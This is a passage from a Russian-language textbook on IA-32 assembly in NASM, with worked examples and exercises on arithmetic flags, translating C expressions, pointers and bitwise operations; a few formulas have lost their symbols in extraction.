        46h – 82h = C4h, при этом по правилам формирования флага CF (Carry
Flag) этот флаг получит значение 1, поскольку первый операнд меньше второго. Ре-
зультат выполнения операции (C4h) отличен от 0, следовательно, флаг ZF (Zero
Flag) получит значение 0. Во флаге SF (Sign Flag) фиксируется значение знакового
бита результата, т.е. его старшего бита. В нашем случае это 1, следовательно, флаг
SF получит значение 1.
Проинтерпретируем полученный результат как десятичное число без знака и число
со знаком:
         C4h = 196 – это значение результата, интерпретируемое как десятичное
число без знака. Это же значение представляет собой дополнительный код отри-
цательного числа -60 (196 = 256 – 60 = доп(-60)), поэтому результат выполне-
ния операции, интерпретируемый как десятичное число со знаком, равен -60.
Для определения значения флага OF (Overflow Flag) промоделируем операцию вы-
читания над знаковыми десятичными числами. Заметим, что второй операнд (чис-
ло 130) представляет собой дополнительный код отрицательного числа -126 (130
= доп(-126)). Следовательно, для знаковых чисел указанное вычитание приобре-
тает вид:
        70 – (-126) = 196


                                                                                27
     Полученный результат (196) не принадлежит допустимому диапазону значений
     знаковых чисел в формате байта [-128, 127], следовательно, флаг OF получит значе-
     ние 1.

     Пример 2-2 Объявление переменной
     Требуется написать ассемблерную программу, в которой:

        1. Выделяется память согласно следующему объявлению


       static int var;


        2. Выделенная память используется для ввода десятичного числа, …

        3. у которого знак меняется на противоположный, …

        4. а само число после этого печатается в шестнадцатеричном формате.

                                       Решение

     Для размещения переменной var используем сегмент статических неинициализи-
     рованных данных .bss. Поскольку размер типа int в архитектуре
     IA-32 составляет четыре байта, используем директиву var resd 1. Выделенная
     память показана на рисунке ниже.




     С точки зрения языка Си переменная var – содержимое четырех байт памяти, но в
     языке ассемблера символьное имя var будет интерпретироваться как адрес, при-
     чем адрес первого байта из четырех, выделенных для хранения некоторых произ-
     вольных данных. Этот адрес, т.е. его символьное обозначение будет использовать-
     ся при обращении к памяти.




28
  extern io_get_dec, io_print_hex, io_newline
  global main

  section .bss
     var resd 1

  section .text
  main:
     CALL io_get_dec      ; Считываем десятичное число в EAX
     MOV DWORD [var], EAX ; Пересылаем его в выделенные 4 байта памяти
     NEG DWORD [var]      ; Меняем у числа знак на противоположный
     MOV EAX, DWORD [var] ; Загружаем значение переменной var на регистр,
                          ; используя ее имя как адрес
     CALL io_print_hex    ; Печатаем число в шестнадцатеричном формате
     CALL io_newline      ; Не забываем затем перейти на новую строку
     MOV EAX, 0
     RET



Пример 2-3 Приведение типа
Записать эквивалентную данному фрагменту на языке Си программу на языке ас-
семблера.


  static short int a = 10;
  static int b = 20, с;
  c = a + b;

                                Решение

Переменные a и b инициализированы при объявлении – размещаем их в секции
.data. Переменная c помещается в секции неинициализированных статических
данных .bss.


  section .data
  a dw 10
  b dd 20

  section .bss
  c resd 1

  section .text
     movsx eax, word [a] ; Знаковое расширение данных
     add    eax, dword [b] ;
     mov    dword [c],eax ;


В вычислении суммы участвуют переменные с разными типами. Прежде чем будет
выполнено сложение, типы операндов должны быть приведены к одному общему

                                                                            29
     типу. В данном случае значение переменной a должно быть расширено до типа
     int.

     Пример 2-4 Приведение беззнакового типа
     Записать эквивалентную данному фрагменту на языке Си программу на языке ас-
     семблера.


       unsigned char z = 0xff;
       unsigned short a = 0xff00;
       unsigned int b;
       b = a * z;


                                      Решение

     Поскольку выполняется арифметическая операция, происходит integer promotions,
     неявное приведение операндов к целому типу стандартного размера. Результат
     операции в данном примере может быть выражен знаковым целым типом стан-
     дартного размера:

                 INT_MIN < 0 < USHRT_MAX × UCHAR_MAX < INT_MAX

     Для 32-разрядной архитектуры IA-32 и компилятора gcc, величины, входящие в не-
     равенство имеют следующие значения.

     Таблица 4. Предельные значения некоторых типов данных языка Си.

     Константа                       Описание                         Величина

     INT_MIN   Минимальное значение стандартного целого типа           -2147483648
     USHRT_MAX Максимальное значение беззнакового короткого                  65535
               целого типа
     UCHAR_MAX Максимальное значение беззнакового целого типа                    255
               char
     INT_MAX   Максимальное значение стандартного целого типа           2147483647


     Объявлены эти константы в стандартном заголовочном файле limits.h.

     Таким образом, выполнение умножения потребует сначала расширить оба опе-
     ранда до стандартного целого типа, потом выполнить операцию знакового умно-
     жения и сохранить результат в переменной b. Причем, последнее присвоение не
     будет производить никаких преобразований над полученным при умножении чис-
     лом.

30
  section .bss
     b resd 1

  section .data
     z db 0xff
     a dw 0xff00

  section .text
     movzx eax, byte [z] ; выполняем беззнаковое расширение
                         ; из 8 разрядов в 32
     movzx edx, word [a] ; выполняем беззнаковое расширение
                         ; из 16 разрядов в 32
     imul eax, edx       ; умножаем
     mov dword [b], eax ; сохраняем полученное значение


Пример 2-5 Умножение
Записать эквивалентную данному фрагменту на языке Си программу на языке ас-
семблера. Описать секции кода, инициализированных и неинициализированных
данных.


  static int a, b = 1, c = -2, d = 3;
  ...
  a = b + c * d;


                                Решение

Переменная a не имеет инициализирующего значения и будет размещена в сек-
ции .bss. Остальные переменные помещаются в секции .data.


  section .bss
  a resd 1

  section .data
  b dd 1
  c dd -2
  d dd 3

В первую очередь вычисляется произведение переменных c и d. Используется
форма инструкции IMUL с одним операндом, второй операнд задан неявно, это ре-
гистр EAX. Результат будет сохранен в паре регистров EDX:EAX. Старшие разряды
результата, т.е. содержимое регистра EDX, в дальнейших вычислениях не исполь-
зуются, поскольку в языке Си тип результата умножения совпадет с типами опе-
рандов-выражений (необходимо не забывать о неявном приведении типов опе-



                                                                            31
     рандов). После сложения полученный результат выгружается обратно из регистра
     EAX в память.


       section .text
          mov eax, dword [c]
          imul dword [d]
          add eax, dword [b]
          mov dword [a], eax


     Пример 2-6 Деление
     Записать эквивалентную данному фрагменту на языке Си программу на языке ас-
     семблера.


       static int x, y;
       ...
       x /= -y;

                                      Решение

     Поскольку x и y объявлены как статические переменные, размещаем их в секции
     неинициализированных статических данных.


       section .bss
          x resd 1
          y resd 1

     Реализация выражения, в котором происходит деление, состоит из загрузки значе-
     ний переменных x и y на регистры, обращения знака, деления и выгрузки полу-
     ченного результата обратно в память.




32
  section .text
     mov eax, dword [х] ; Записываем в регистр eax значение
                        ; переменной x. Поскольку в дальнейшем
                        ; это значение будет выступать в
                        ; качестве делимого, его необходимо
                        ; разместить в паре регистров edx:eax
                        ; Таким образом, 32-разрядное знаковое
                        ; число будет расширено до 64 разрядов.
                        ; верхние 32 разряда заполнятся знаковым
                        ; битом.
     mov edx, eax       ; Копируем значение переменной x в edx
     sar edx, 31        ; Сдвигаем число на 31 разряд – все
                        ; разряды регистра будут заполнены
                        ; знаковым битом, т.к. сдвиг
                        ; арифметический, пара регистров edx:eax
                        ; готова к знаковому делению.
     mov ecx, dword [y] ; Записываем в регистр ecx значение
                        ; переменной y
     neg ecx            ; Меняем знак числа, т.е. получаем
                        ; значение (–y)
     idiv ecx           ; делим
     mov dword [x], eax ; частное из регистра eax записываем в
                        ; память, где размещена переменная x


Пример 2-7 Арифметика «длинных» чисел
По заданному фрагменту на языке Си написать эквивалентный код на языке ассем-
блера.


  static long long x;
  …
  x++;

                                Решение

Переменная x будет размещена в секции неинициализированных статических дан-
ных в формате учетверенного слова:


  section .bss
     x resq 1


Поскольку максимальный допустимый размер операнда в арифметических коман-
дах – двойное слово (32 бита), для реализации арифметики над 64-разрядными
числами их разбивают на две части по 32 бита каждая и выполняют соответствую-
щие операции над этими частями. В нашем случае необходимо увеличить млад-


                                                                           33
     шую часть x на 1 и учесть возникающий при этом возможный перенос из старшего
     разряда. Возникающий при сложении младших частей перенос фиксируется во
     флаге CF, поэтому дальнейшее сложение старших частей надо выполнять с учетом
     данного флага, для чего следует использовать команду ADC. Принимая во внима-
     ние «перевернутое» представление в памяти чисел размером больше байта, полу-
     чаем следующий код:


       section .text
          add dword[x], 1     ; Сложение младших частей
          adc dword[x + 4], 0 ; Учитываем возможный перенос из
                              ; старшего разряда


     Заметим, что реализовывать в данном примере увеличение младшей части x на 1
     командой INC нельзя, т.к. она не формирует флаг CF и, следовательно, не позволя-
     ет учитывать возможный перенос.

     Задачи

     Задача 2-1 Присваивание различных типов
     Реализовать присваивание b = a; (не более двух команд) при условии:


       // a
       static unsigned char a;
       static unsigned int b;

       // b
       static char a;
       static short b;


     Задача 2-2 Интерпретация арифметических инструкций
     Выпишите значение регистра AL в виде десятичного числа (знакового и беззнако-
     вого), а также флаги CF, OF, ZF и SF после выполнения следующих инструкций.


       ; a                                    ; c
          MOV AL, 199                            MOV AL, -13
          ADD AL, -61                            ADD AL, 179

       ; b                                    ; d
          MOV AL, -35                            MOV AL, 2
          SUB AL, 216                            SUB AL, 200




34
Задача 2-3 Реализация вычисления арифметических выражений
Приведите фрагмент программы на ассемблере для вычисления следующих выра-
жений.


  // a
     static int x, y;
     y = (x / y) * (x % y);

  // b
     static unsigned char a;
     static int b;
     b = (a - 500000) % 10;


Задача 2-4 Цифры и число
Пусть


  static unsigned short n; // 100 <= n <= 999


Приведите фрагмент ассемблерного кода для записи в n числа, полученного выпи-
сыванием в обратном порядке десятичных цифр исходного числа n.

Задача 2-5 64 на 32
Даны 64-разрядные переменные x и y. Реализовать операции.


  // a
  x += y;
  // b
  x -= y;


Задача 2-6 Быстрая арифметика
Используя команду LEA, реализуйте быстрое вычисление следующих арифметиче-
ских выражений:


  static int a, b, c;
  // a
     c = 10 * a + b + 14;
  // b
     c = 24 * a – 15 + b;


Задача 2-7 Ошибки в коде
Зачеркните инструкции, содержащие ошибки.


                                                                           35
     X RESD 1

     ADC WORD [X], WORD [EAX]
     MUL AL, AH
     NEG CF
     SBB DWORD [X], 100
     MOV EAX, X
     DIV 15
     SUB EAX, WORD [X]
     MOVSX EBX, BL
     XCHG WORD[X], 100
     IDIV BYTE [EAX]
     MOV AL, -150
     IMUL EAX, 5




36
3.     Указатели и адресная арифметика
Взятие адреса и разыменование
Статические переменные располагаются в одной из секций статических данных;
если у переменных не происходит инициализация при объявлении, то располо-
жить их допустимо в секции .bss. В языке ассемблера адрес статической перемен-
ной – ее символическое имя. Это имя необходимо присвоить переменной xp.


     static int *xp;                    section .bss
     static int x;                         xp resd 1
     xp = &x;                              x resd 1

                                        section .text
                                           mov    dword [xp], x


Отображение оператора разыменования в язык ассемблера
Располагаем все переменные в сегменте статической памяти .bss.


     static int *xp;
     static int x, y;

     x = *xp;

     *xp = y;

     section .bss
        xp resd 1
        x resd 1
        y resd 1

     section .text
        mov edx, dword [xp]    ; помещаем в EDX значение переменной xp
        mov eax, dword [edx]   ; помещаем в EAX значение ячейки
                               ; памяти, на которую ссылается xp
       mov dword [x], eax      ; присваиваем это значение x

       mov eax, dword [y]      ; помещаем в EAX значение переменной y
       mov dword [edx], eax    ; в регистре EDX уже находится значение
                               ; переменной xp. Это значение
                               ; используется как адрес, по которому
                               ; будет записано содержимое EAX


Пример 3-1 Двукратное разыменование
Дана статическая переменная p:

                                                                            37
       static int **p;


     Требуется на языке ассемблера написать фрагмент программы, который вычисляет
     выражение **p + 1 и печатает его значение на стандартный вывод, используя
     функцию io_print_dec.

                                       Решение

     Заданное выражение предполагает двойное разыменование указателя и увеличе-
     ние полученного значения на единицу.


       extern io_print_dec
       global main

       section .text
       main:
          MOV EAX, DWORD [p]         ; Записываем в регистр EAX значение
                                     ; переменной p
           MOV   EAX, DWORD [EAX]    ; Используем это значения для доступа
                                     ; к памяти, теперь в регистре EAX
                                     ; не p, а *p
           MOV EAX, DWORD [EAX]      ; Повторяем – теперь в EAX находится **p
           INC EAX                   ; Увеличиваем это значение на единицу
           CALL io_print_dec         ; Печатаем
           XOR EAX, EAX              ;
           RET                       ;


     Пример 3-2 Разыменование и побочные эффекты
     Дан фрагмент кода на языке Си.


       static short *px, *py;
       ...
       *px++ = --*py;


     Требуется привести эквивалентную программу на языке ассемблера.

                                       Решение

     В первую очередь требуется определить, какие данные должны быть определены
     в ассемблерной программе. Во фрагменте Си-кода объявлены две переменные ти-
     па short*. Несмотря на то, что тип short занимает два байта, указатель будет за-
     нимать четыре байта, поскольку адресация в IA-32 32-х разрядная, т.е. под адрес



38
памяти необходимы 4 байта. Выписываем следующие директивы ассемблера
Nasm:


  section .bss
     px resd 1
     py resd 1


Статические переменные располагаются в секциях статических данных. Поскольку
нет кода инициализации этих переменных, их допустимо разместить в секции ста-
тических неинициализированных данных .bss, в противном случае переменные
были бы объявлены и проинициализированы в секции .data.

Для того чтоб было проще корректно реализовать на ассемблере заданное выра-
жение, преобразуем его, избавившись от побочных эффектов. Помимо того, рас-
ставим скобки для явного указания порядка выполняемых операций.


  *px++ = --*py;


  *(px++) = --(*py);


  --(*py);
  *px = *py;
   px++;

  *py = *py – 1; // (1)
  *px = *py;     // (2)
   px = px + 1; // (3)


Теперь последовательно переводим каждый оператор в соответствующий код на
языке ассемблера.




                                                                            39
       section .text
       mov eax, dword [py] ; (1) записываем в регистр eax значение
                           ;     переменной py
       dec word [eax]      ;     уменьшаем на единицу 16-разрядную
                           ;     величину, которую адресует регистр
                           ;     eax, т.е. переменная py
       mov cx, word [eax] ; (2) записываем в регистр cx эту измененную
                           ;     величину
       mov eax, dword [px] ;     записываем в регистр eax значение
                           ;     переменной px
       mov word [eax], cx ;      используя это значение, записываем в
                           ;     то место памяти, которое адресуется
                           ;     указателем px, текущее значение *py
       add dword [px], 2   ; (3) Увеличиваем указатель px. Согласно
                           ;     правилам адресной арифметики языка Си
                           ;     значение указателя будет увеличено на
                           ;     1 * sizeof(short), т.е на 2


     Пример 3-3 Восстановление кода
     Функция, имеющая следующий прототип


       void decode1(int *xp, int *yp, int *zp)


     была скомпилирована в ассемблерный код. Тело функции выглядит следующим
     образом.


       mov edi, dword [ebp + 8] ; (1)
       mov edx, dword [ebp + 12] ; (2)
       mov ecx, dword [ebp + 16] ; (3)
       mov ebx, dword [edx]      ; (4)
       mov esi, dword [ecx]      ; (5)
       mov eax, dword [edi]      ; (6)
       mov dword [edx], eax      ; (7)
       mov dword [ecx], ebx      ; (8)
       mov dword [edi], esi      ; (9)


     Параметры xp, yp и zp находятся в памяти по смещениям 8, 12 и 16 относительно
     адреса, содержащегося в регистре ebp. Напишите код тела функции decode1 на
     языке Си, который был бы эквивалентен представленному ассемблерному коду.

                                     Решение

     В первых трех инструкциях выполнилась загрузка значений формальных парамет-
     ров функции на регистры.

40
  mov edi, dword [ebp + 8] ; (1) edi ← xp
  mov edx, dword [ebp + 12] ; (2) edx ← yp
  mov ecx, dword [ebp + 16] ; (3) ecx ← zp



В следующих трех инструкциях эти регистры использовались для доступа к содер-
жимому памяти, т.е. параметры-указатели разыменовывались, и соответствующие
значения из памяти пересылалась в регистры ebx, esi, eax.


  mov ebx, dword [edx]           ; (4) ebx ← *yp
  mov esi, dword [ecx]           ; (5) esi ← *zp
  mov eax, dword [edi]           ; (6) eax ← *xp


В последних трех инструкциях регистры edi, edx, ecx, содержащие адреса, снова
использовались для доступа к памяти, но в этот раз происходила запись тех значе-
ний, которые были ранее размещены на регистрах ebx, esi, eax.


  mov dword [edx], eax           ; (7) *yp ← eax ← *xp
  mov dword [ecx], ebx           ; (8) *zp ← ebx ← *yp
  mov dword [edi], esi           ; (9) *xp ← esi ← *zp


Если ввести три вспомогательные переменные для хранения значений считывае-
мых из памяти, получим следующий Си-код.


  void decode1(int *xp, int *yp, int *zp) {
      int y = *yp;
      int z = *zp;
      int x = *xp;
      *yp = x;
      *zp = y;
      *xp = z;
  }


Переменная y соответствует ebx, z – esi, x – eax.

Указатели и массивы
В языке Си обращение к указателям и массивам происходит единообразно. К ним
можно применять адресную арифметику и индексное выражение. Однако имеется
существенное отличие в ассемблерном коде, реализующем текстуально одинако-
вые выражения. Отличие обусловлено тем, как выделятся память при объявлении
указателей и массивов.


                                                                              41
     Пример 3-4 Адресная арифметика и массивы
     Для приведенного фрагмента Си-кода требуется написать соответствующий фраг-
     мент ассемблерной программы.


           static short *p;
           static short a[3];
       …
           p[1] = *(а + 2);



                                      Решение

     В приведенном фрагменте массив используется как указатель, а указатель – как
     массив, с индексным выражением. Тем не менее, ассемблерный код будет отра-
     жать особенности фактического выделения памяти. На рисунке ниже показано
     распределение данных в памяти: черные линии показывают группировку байт в
     базовые типы, серым цветом показаны выделенные байты. Снизу памяти данные
     подписаны в терминах языка Си, сверху – адреса, используемые в ассемблерном
     коде.




     Память выделена для указателя p, но не для тех ячеек, на которые он указывает.
     Поэтому, что вычислить адрес первого элемента последовательности int-ов, на
     которые указывает p, необходимо загрузить адрес (значение переменной p) из па-
     мяти в регистр. В случае с массивом память была выделена для всех элементов, а
     имя массива интерпретируется как адрес начала выделенной памяти. Поэтому при
     извлечении элемента с индексом два имя массива следует сразу же использовать в
     адресном коде в качестве базы.


       mov    dx, word [а + 4]      ; *(а + 2) – то же, что и a[2]
                                    ; a – адрес, начиная с которого
                                    ; в памяти размещены элементы массива
       mov    eax, dword [p]        ; Значение переменной p – адрес,
       mov    word [eax + 2], dx    ; который указывает на начало
                                    ; массива




42
Пример 3-5 Массив указателей
Для приведенного фрагмента Си-кода требуется написать соответствующий фраг-
мент ассемблерной программы.


      static int *p[10];
      static int x;
      x = *p[8] + 1;


                                  Решение

В первую очередь определим, как данные были расположены в памяти.




Элементами массива p являются указатели на целые числа. Массив занимает 40
байт, элементы массива расположены непрерывно, каждый элемент занимает 4
байта.

Обращение к 8-му элементу означает выборку данных по адресу p+32, далее про-
исходит разыменование, т.е. значение этого элемента трактуется как адрес, по ко-
торому лежит требуемое число. После того, как это число извлечено из памяти к
нему прибавляется 1, результат сложения записывается в память по адресу х.


  mov     eax, dword [p + 32]
  mov     eax, dword [eax]
  add     eax, 1
  mov     dword [x], eax


Задачи

Задача 3-1 Восстановление Си-кода
Функция, имеющая следующий прототип


  void decode2(int *xp, int *yp, int *zp)


была скомпилирована в ассемблерный код. Тело функции выглядит следующим
образом.


                                                                              43
       mov     eax, dword [ebp + 12]
       mov     edi, dword [eax]
       mov     eax, dword [ebp + 8]
       mov     edx, dword [eax]
       mov     eax, dword [ebp + 16]
       mov     eax, dword [eax]
       add     edx, eax
       mov     eax, dword [ebp + 12]
       mov     dword [eax], edx
       mov     eax, dword [ebp + 8]
       mov     dword [eax], edx
       mov     eax, dword [ebp + 16]
       mov     dword [eax], edi


     Параметры xp, yp и zp находятся в памяти по смещениям 8, 12 и 16 относительно
     адреса, содержащегося в регистре ebp. Напишите код тела функции decode2 на
     языке Си, который был бы эквивалентен представленному ассемблерному коду.

     Задача 3-2 Побочный эффект
     Написать фрагмент ассемблерного кода, эквивалентный данному фрагменту на
     языке Си.


       // a
       int x, *px;
       *px++ = x -10;

       // b
       short x, *px;
       x = *(--px + 4);


     Задача 3-3 Среднее арифметическое
     Дан массив из 100 целых чисел. Написать фрагмент ассемблерного кода, который
     помещает в регистр eax среднее арифметическое первого и последнего элементов
     массива при условии, что элементы массива имеют тип:

       a) char,
       b) short,
       c) int.

     Задача 3-4 Разность указателей
     Для приведенного фрагмента Си-кода написать соответствующий фрагмент ассем-
     блерной программы.




44
  static int a[50];
  static int *p, *q;
  static int n;

  p = &a[10];
  q = &a[25];
  n = q - p;


Задача 3-5 Реализовать Си-код
Для приведенного фрагмента Си-кода написать соответствующий фрагмент ассем-
блерной программы.


  // a
  short **p;
  ++*(*(p+=3) -= 2);

  // b
  char **q, **r, **t;
  r = q++;
  *t = (*r)++;
  **q = (**t)++;




                                                                          45
     4.     Операции над битовыми векторами
     Поразрядные (побитовые) операции
     Набор команд IA-32 поддерживает поразрядные команды, работающие с вектора-
     ми битов: NOT, AND, XOR, OR. Помимо получения результата, команды формируют
     флаги, наибольший интерес среди которых обычно представляет флаг ZF.

     Приведенные команды естественным образом реализуют побитовые логические
     операции языка Си над целыми числами, тогда как работу с логическими величи-
     нами необходимо реализовывать другими способами.

     Команда TEST работает аналогично команде AND с той лишь разницей, что резуль-
     тат выполнения команды никуда не заносится и, следовательно, значение первого
     операнда не изменяется. Обычно команда TEST применяется для проверки на 0
     отдельных битов первого операнда. Например, проверка на четность содержимого
     регистра eax выглядит следующим образом:


          test   eax, 1
          jz     .even  ;    Переходим на метку, если eax четно


     Приведем еще два распространенных примера использования побитовых опера-
     ций:


          xor    eax, eax   ; Обнуление регистра (вместо   mov   eax, 0)

          test   eax, eax ; Проверка на 0 содержимого регистра
                          ; (вместо cmp eax, 0)


     Заметим, что в силу специфики выполнения побитовых операций команды в при-
     веденных примерах выполняются быстрее, чем аналогичные действия, выполнен-
     ные без использования побитовых операций.

     Пример 4-1 Логические операции над битовыми векторами
     Даны четыре статические переменные целого типа a, b, c, d. Написать фрагмент
     кода на языке ассемблера, вычисляющий значение переменной a.


          static int a, b, c, d;

          a = ~(a & b) | ((~c & d) | (c & ~d));




46
                                 Решение

Переменные a, b, c и d размещаем в статической памяти, в сегменте .bss. При вы-
числении будем следовать заданному порядку вычисления выражения, хотя ис-
пользуемые в выражении операции позволяют этот порядок менять.

Следует заметить, что при вычислении подвыражения (~c & d) | (c & ~d) необ-
ходимо пользоваться регистрами для выполнения побитового отрицания, т.к.
непосредственное выполнение этой операции над ячейками памяти «испортит»
значение переменной, расположенное в этих ячейках.


  section .bss
     a resd 1
     b resd 1
     c resd 1
     d resd 1

  section .text
     mov eax, dword [c]      ; eax ← c
     mov edx, dword [d]      ; edx ← d
     mov ecx, eax            ; создаем копию переменной c в ecx
     not eax                 ; eax ← ~c
     and eax, edx            ; eax ← ~c & d
     not edx                 ; edx ← ~d
     and ecx, edx            ; ecx ← c & ~d
     or   eax, ecx           ; eax ← (~c & d) | (c & ~d)
     mov edx, dword [a]      ; edx ← a
     and edx, dword [b]      ; edx ← a & b
     not edx                 ; edx ← ~(a & b)
     or   eax, edx           ; eax ← ~(a & b) | ((~c & d) | (c & ~d))
     mov dword [a], eax      ;   a ← ~(a & b) | ((~c & d) | (c & ~d))


Сдвиги и вращения
К побитовым операциям относятся также команды сдвигов. Основные виды сдви-
гов реализуются командами SHR, SHL, SAR, SAL, ROR, ROL, RCR, RCL.

С помощью сдвигов можно реализовать быстрое умножение и деление на 2n (см.
таблицу 5).

Все указанные команды выполняются значительно быстрее традиционных команд
умножения и деления (MUL, IMUL, DIV, IDIV), поэтому целесообразно использовать
именно их для реализации соответствующих операций при вычислении арифмети-
ческих выражений.

Таблица 5. Реализация быстрого умножения и деления на степени 2.


                                                                             47
     Выражение      op *= 2n             op /= 2n              op %= 2n, op >= 0

     Команда        SHL op, n            числа без знака:      AND op, 2n-1
                                         SHR op, n

                                         числа со знаком:
                                         SAR op, n



     Пример 4-2 Двигаем и вращаем
     Даны две статические переменные a и b размером 2 байта. Требуется регистр EAX
     заполнить следующим образом: верхние 2 байта должны содержать значение пе-
     ременной a, а нижние 2 байта – значение переменной b, циклически сдвинутое на
     5 бит вправо.

                                      Решение


       section .bss
          a resw 1
          b resw 1

       section .text
          mov ax, word [a]      ; помещаем значение переменной a в младшие
                                ; 16 разрядов
                                ; регистра EAX
           shl eax, 16          ; сдвигаем это значение в верхние байты
           mov ax, word [b]     ; помещаем значение переменной b в
                                ; освободившиеся разряды регистра EAX и …
           ror ax, 5            ; … выполняем над ними циклический сдвиг


     Пример 4-3 Реализация умножения регистра на константу через сложе-
     ния и сдвиги
     Реализовать умножение значения, лежащего в регистре eax на 6, используя только
     операции логического сдвига и сложения. Результат поместить в eax.




48
                                 Решение


  mov ebx, eax ; копируем значение в регистр ebx
  shl ebx, 2   ; сдвигаем значение ebx влево на 2 бита
               ; (эквивалентно умножению на 4)
  shl eax,1    ; сдвигаем значение eax влево на 1 бит
               ; (эквивалентно умножению на 2)
  add eax, ebx ; складываем получившиеся значения,
               ; результат в регистре eax


Пример 4-4 Восстановление выражения
Дан код на языке Си, в котором пропущены выражения, присваивающие значения
локальным переменным.


  int arith(int x, int y, int z) {
     int t1 = _________;
     int t2 = _________;
     int t3 = _________;
     int t4 = _________;
     return t4;
  }


Дан ассемблерный код, который был сгенерирован компилятором. Параметры
расположены следующим образом: x лежит по адресу [ebp + 8], y – по адресу
[ebp + 12], z – по адресу [ebp + 16].


  mov eax, dword [ebp + 12]     ; (1)
  xor eax, dword [ebp + 8]      ; (2)
  sar eax, 3                    ; (3)
  not eax                       ; (4)
  sub eax, dword [ebp + 16]     ; (5)


Требуется восстановить пропущенные выражения.

                                 Решение

Инструкция в первой строке ассемблерного кода выполняет пересылку значения
переменной-параметра y на регистр eax. Остальные четыре инструкции преобра-
зуют данные, распределим эти операции по выражениям в Си-программе.

Во второй строке выполняется операция xor над значениями переменных y и x.
Полученный результат сохраняется в регистре eax. Далее (строка №3) это значение


                                                                             49
     было сдвинуто вправо на 3 разряда. Причем сдвиг арифметический, не логический,
     что согласуется со знаковым типом сдвигаемой переменной. В четвертой строке
     выполняется побитовое отрицание, в последней, строке №5, из этого значения был
     вычтен параметр z.

     Следует отметить, что все результаты вычислений не записывается в память, а
     продолжают сохраняться на одном и том же регистре eax. Все автоматические ло-
     кальные переменные не были размещены в памяти, что позволяет характер вы-
     полняемых вычислений – никаких действий с адресами этих переменных не про-
     исходило.


       int arith(int x, int y, int z) {
          int t1 = y ^ x;
          int t2 = t1 >> 3;
          int t3 = ~t2;
          int t4 = t3 - z;
          return t4;
       }


     Возвращаемое значение в данной функции – переменная t4, после выполнения
     инструкции в строке №5 ее значение уже расположено в регистре EAX, который ис-
     пользуется для передачи возвращаемого функцией значения.

     Пример 4-5 Обращение операций
     После выполнения последовательности команд в регистре EAX было получено не-
     которое значение. Восстановите содержимое ячеек памяти.


       x db _____________________
       movsx eax, word [x]
       ror   eax, 4
       ; EAX = 0xfffffbee

                                      Решение

     Первое необходимое действие – определить значение EAX перед командой ror.
     Поскольку вращение циклически сдвинуло содержимое регистра на 4 разряда все
     шестнадцатеричные цифры остались неизменны, но последняя оказалась крайней
     слева. Таким образом, значение EAX перед вращением – 0xffffbeef.

     Выполнение команды movxs привело к заполнению двух старших байтов в реги-
     стре EAX единицами, что согласуется с содержимым младших байтов: при перево-
     де старшей шестнадцатеричной цифры в числе 0xbeef в последовательность бит
     получаем старший (знаковый) бит – 1. Величина 0xbeef была размещена в памяти,


50
начиная с адреса x. При размещении использовались директивы db, что привело к
разделению числа на два отдельных байта и явному развороту их порядка: первым
идет 0xef, затем – 0xbe.

    x db 0xef, 0xbe
    movsx eax, word [x]
    ror   eax, 4
    ; EAX = 0xfffffbee


Пример 4-6 Безусловный модуль
Требуется вычислить модуль числа, не используя команд условной передачи дан-
ных и условной передачи управления.

                                     Решение

Пусть число, для которого будет вычисляться модуль, уже загружено в регистр eax.
Воспользуемся следующими фактами. Арифметический сдвиг влево на 31 разряд
заполнит знаковым битом весь битовый вектор. В зависимости от того, какое знак у
числа был изначально, будет получено либо 0, либо -1.

Другой факт заключается в том, что побитовое обращение устанавливает взаимно
однозначное соответствие между отрицательными и неотрицательными числами:

00  00b  0 
              not
                   1  11 11b
00  01b  1
             not
                  2  11 10b

01 10b  2147483646 
                      not
                           -2147483647  10  01b
01 11b  INT_MAX 
                   not
                        INT_MIN  (-INT_MAX - 1)  10  00b

Таким образом, NOT(x) = -(x+1).

Третий факт касается свойств Исключающего Или: a  0  a, a  1  a .

Эти три факта в совокупности позволяют составить следующий код, реализующий
формулу sign( x)  ( x  sb)  sb , где sb – результат арифметического сдвига на 31 раз-
ряд. Для положительных чисел xor и sub берут в качестве второго операнда 0, что
никак не меняет eax. Для отрицательного числа формула приобретает вид
( x  1 1b )  (1)  NOT ( x)  1   x .


    mov ecx, eax
    sar ecx, 31
    xor eax, ecx
    sub eax, ecx



                                                                                      51
     Манипуляции с отдельными битами
     Для манипуляции с отдельными битами используются команды BTS, BTR, BTC, поз-
     воляющие устанавливать нужные значения указанному биту операнда. Например:


       bts    op,   5 ; Установить в 1 пятый бит операнда op


     Пример 4-7 Установка и сброс отдельных битов
     Дана 32-битная статическая переменная a. Требуется установить в этой перемен-
     ной бит 3 в значение 1, сбросить бит 17 в значение 0, а значение бита 23 заменить
     на противоположное.

                                       Решение

     Для манипуляций с отдельными битами используем инструкции bts, btr, btc.


       section .bss
           a resd 1

       section .text
           bts   dword [a], 3
           btr   dword [a], 17
           btc   dword [a], 23


     Задачи

     Задача 4-1 Знак числа
     Пусть переменная x содержит некоторое целочисленное значение. Не используя
     инструкции условного перехода, поместить в регистр eax 1, если x < 0, и 0 в про-
     тивном случае.


       // a                     // b                    // c
       static int x;            static short x;         static char x;


     Задача 4-2 Обмен битами
     В регистре eax заменить 5 левых битов на 5 правых битов.

     Задача 4-3 Арифметика без арифметических команд
     Приведите фрагмент ассемблерного кода для вычисления выражений.




52
  // a
  static unsigned x, y;
  y = 32 * x – x / 8 + x % 16;

  // b
  static long long x;
  x *= 2;

  // c
  static int x, y;
  y = x / 64 + x * 4;



Задача 4-4 Интерпретация кода
Укажите значения регистров eax (как десятичное число со знаком) и edx (как деся-
тичное число без знака) после выполнения следующего фрагмента кода.


  section .data
     x dd 0xfeff0201
  section .text
     mov cx, word [x + 1]
     mov ax, cx
     imul ah
     shl ax, cl
     movsx eax, ax
     movzx edx, ax


Задача 4-5 Подсчет числа единиц
Подсчитать количество двоичных единиц в двоичном представлении заданного
целого неотрицательного числа.

Задача 4-6 Подряд идущие единицы
В регистр eax поместить значение 1, если в двоичном представлении заданного
целого числа встречается подряд 5 единиц, и 0 в противном случае.

Задача 4-7 Проверка четности
Не используя команд деления и не меняя значения переменной а, реализовать пе-
реход на метку L в том и только в том случае, если значение a четно.

Задача 4-8 Битовый разворот
"Перевернуть" содержимое регистра ЕАХ в битовом представлении.

Задача 4-9 Sign
Реализуйте функцию sign, используя только инструкции MOV, SHR, NEG и OR.



                                                                              53
     Задача 4-10 Крайний правый
     Для данного машинного слова, сформируйте в регистре слово, с единственным
     установленным в 1 битом в позиции крайнего правого 0 исходного слова.
     Например: 10100111  00001000

     Задача 4-11 Замена инструкций
